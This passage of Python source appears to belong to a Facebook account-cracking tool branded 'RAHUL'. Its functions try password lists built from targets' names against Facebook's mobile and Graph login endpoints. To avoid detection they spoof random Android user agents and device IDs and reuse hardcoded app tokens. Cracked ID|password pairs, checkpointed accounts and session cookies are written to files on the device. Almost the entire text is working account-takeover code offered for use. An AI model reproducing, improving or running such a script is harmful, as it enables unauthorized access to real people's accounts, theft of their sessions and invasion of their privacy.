        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M2] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {                         
                           'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RAHUL=str(session.cookies)
                        if "c_user" in RAHUL:
                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAHUL:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1        
xxxxx=('Dalvik/2.1.0 (Linux; U; Android 7.1.2; VUVAMINI Build/NHG47L)','Dalvik/2.1.0 (Linux; U; Android 9; HOTREALS Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 11; DECSMART Build/RTT0.211009.001)','Dalvik/2.1.0 (Linux; U; Android 12; T28-EEA Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (XT2115DL) Build/RPCS31.Q2-109-16-16)','Dalvik/2.1.0 (Linux; U; Android 8.1; HOT10 Build/MMB29M)','Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.58.0)','Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-14)','Dalvik/2.1.0 (Linux; U; Android 11; KIVI 4K Android TV Build/RTM5.220609.207)','Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)','Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)','Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)','Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)','Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)','Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)','Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)','Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) VD/229','Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012) VD/233','Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)','Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)','Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)','Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1) ;Pixel 6a','Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)','Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)','Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)','Dalvik/2.1.0 (Linux; U; Android 9; Aquaris X Pro Build/PQ3A.190801.002)','Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R112-15359.58.0)','Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)','Dalvik/2.1.0 (Linux; U; Android 11; XM-SW1 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; LM-V600 Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 13; M2101K7AI Build/TQ1A.230105.002)','Dalvik/2.1.0 (Linux; U; Android 13; Nokia G20 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 13; 22041219PI Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 10.0; B9212A Build/O11019)','Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6826B Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-31-3)','Dalvik/2.1.0 (Linux; U; Android 11; M2003J15SC Build/RP1A.200720.011) VD/233','Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) PB/102','Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415FN Build/M1AJQ) PB/102','Dalvik/2.1.0 (Linux; U; Android 13; DN2101 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 13; PHB110 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 12; Helium Pro Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 11; MS5539G Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 10; VRD-W10 Build/HUAWEIVRD-W10)','Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)')

def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M3] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                useragent  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.0,width=1280,height=800};FBLC/'+fblc+';FBCR/;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/'+fbca+';]"
                                sim = str(random.randint(11111, 99999))
                                xfb_device = str(random.randint(1111, 9999))
                                android_version=str(random.randrange(6,13))
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = { "adid": str(uuid.uuid4()),
                                        "format": "json",
                                        "device_id": str(uuid.uuid4()),
                                        "cpl": "true",
                                        "family_device_id": str(uuid.uuid4()),
                                        "credentials_type": "device_based_login_password",
                                        "error_detail_type": "button_with_disabled",
                                        "source": "device_based_login",
                                        "email": ids,
                                        "password": pas,
                                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                        "generate_session_cookies": "1",
                                        "meta_inf_fbmeta": "",
                                        "advertiser_id": str(uuid.uuid4()),
                                        "currently_logged_in_userid": "0",
                                        "locale": "en_US",
                                        "client_country_code": "US",
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                    }
                                head = {
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        'Host': 'graph.facebook.com',
                                        "X-Fb-Privacy-Context": "2368177546817046",
                                        "X-Graphql-Client-Library": "graphservice",
                                        "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE",
                                        "X-Graphql-Request-Purpose": "fetch",
                                        "X-Fb-Background-State": "1",
                                        "User-Agent":gttt,
                                        "X-FB-Net-HNI": "41001",
                                        "X-FB-SIM-HNI": "41001",
                                        "X-FB-Connection-Type": "MOBILE.LTE",
                                        "X-Tigon-Is-Retry": "False",
                                        "x-fb-session-id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                                        "x-fb-device-group": "4481",
                                        "X-FB-Friendly-Name": "SuggestionsFriendListContentQuery",
                                        "X-FB-Request-Analytics-Tags": "graphservice",
                                        "Accept-Encoding": "gzip, deflate",
                                        "X-FB-HTTP-Engine": "Liger",
                                        "X-FB-Client-IP": "True",
                                        "X-FB-Server-Cluster": "True",
                                        "x-fb-connection-token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                                        "Connection": "Keep-Alive"}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api2(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M4] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                useragent  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.0,width=1280,height=800};FBLC/'+fblc+';FBCR/;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/'+fbca+';]"
                                sim = str(random.randint(11111, 99999))
                                xfb_device = str(random.randint(1111, 9999))
                                android_version=str(random.randrange(6,13))
                                device_id = str(uuid.uuid4())
                                
                                adid = str(uuid.uuid4())
                                data = { "adid": str(uuid.uuid4()),
                                        "format": "json",
                                        "device_id": str(uuid.uuid4()),
                                        "cpl": "true",
                                        "family_device_id": str(uuid.uuid4()),
                                        "credentials_type": "device_based_login_password",
                                        "error_detail_type": "button_with_disabled",
                                        "source": "device_based_login",
                                        "email": ids,
                                        "password": pas,
                                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                        "generate_session_cookies": "1",
                                        "meta_inf_fbmeta": "",
                                        "advertiser_id": str(uuid.uuid4()),
                                        "currently_logged_in_userid": "0",
                                        "locale": "en_US",
                                        "client_country_code": "US",
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                    }
                                head = {
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Host": "graph.facebook.com",
                                        "X-Fb-Privacy-Context": "2368177546817046",
                                        "X-Graphql-Client-Library": "graphservice",
                                        "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE",
                                        "X-Graphql-Request-Purpose": "fetch",
                                        "X-Fb-Background-State": "1",
                                        "User-Agent":gttt,
                                        "X-FB-Net-HNI": "41001",
                                        "X-FB-SIM-HNI": "41001",
                                        "X-FB-Connection-Type": "MOBILE.LTE",
                                        "X-Tigon-Is-Retry": "False",
                                        "x-fb-session-id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                                        "x-fb-device-group": "4481",
                                        "X-FB-Friendly-Name": "SuggestionsFriendListContentQuery",
                                        "X-FB-Request-Analytics-Tags": "graphservice",
                                        "Accept-Encoding": "gzip, deflate",
                                        "X-FB-HTTP-Engine": "Liger",
                                        "X-FB-Client-IP": "True",
                                        "X-FB-Server-Cluster": "True",
                                        "x-fb-connection-token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                                        "Connection": "Keep-Alive"}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
        global loop,oks,lim
        p=round(loop*100/lim,2)           
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        application_version_code=str(random.randint(000000000,999999999))
                        fbs=random.choice(fbks)
                        gtt=random.choice(xxxxx)
                        gttt=random.choice(xxxxx)
                        ua=random.choice(ugen)
                        useragent = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.0,width=1280,height=800};FBLC/'+fblc+';FBCR/;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/'+fbca+';]"
                        android_version=str(random.randrange(6,13))
                        ua_string = 'Mozilla/5.0 (realme; CPU realme OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5358a [FBAN/FBIOS;FBDV/realme,8;FBMD/realme;FBSN/iOS;FBSV/16.0;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]'
                        device_id = str(uuid.uuid4())
                        adid = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                "community_id": "",
                                "try_num": "1",
                                "relative_url": "auth.login",
                                'error_detail_type':'button_with_disabled',
                                'locale': 'pl_PL', 'client_country_code': 'PL',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                "method": "auth.login",
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'X-FB-device-group': str(random.randint(2000, 4000)),
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                                "X-FB-Request-Analytics-Tags": "graphservice",
                                'X-FB-Friendly-Name':'authenticate',
                                "User-Agent":gttt,
                                'X-FB-Connection-Type':'unknown',
                                'X-FB-connection-quality':'EXCELLENT',
                                "X-Tigon-Is-Retry": "False",
                                "X-Tigon-Is-Retry": "False",                        
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        #print(po)
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/RAHUL-OK-RNDM.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

try:
        approval()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()

